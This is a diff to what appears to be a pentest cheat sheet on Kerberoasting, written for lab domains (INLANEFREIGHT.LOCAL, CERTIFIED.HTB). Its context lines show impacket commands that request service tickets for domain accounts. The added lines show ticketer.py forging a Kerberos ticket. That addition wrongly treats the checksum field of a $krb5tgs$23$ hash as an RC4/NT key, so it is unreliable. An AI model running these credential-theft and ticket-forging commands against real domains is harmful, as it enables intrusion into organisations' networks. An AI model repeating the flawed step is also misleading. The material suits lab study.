@@ -29,6 +29,17 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
 ```
 
+#### use the RC4-HMAC Key to get ccache
+example: $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$3ec6d2d73c42a4666917369a3a0181a7$...
+
+Between the two dollars sign.
+
+```bash
+python ticketer.py -nthash 3ec6d2d73c42a4666917369a3a0181a7 -domain CERTIFIED.HTB -user management_svc -spn certified.htb/management_svc -target-domain CERTIFIED.HTB -dc-ip 192.168.1.10 -outfile ticket.kirbi
+
+```
+
+
 # From Windows
 
 ## Semi manual way.
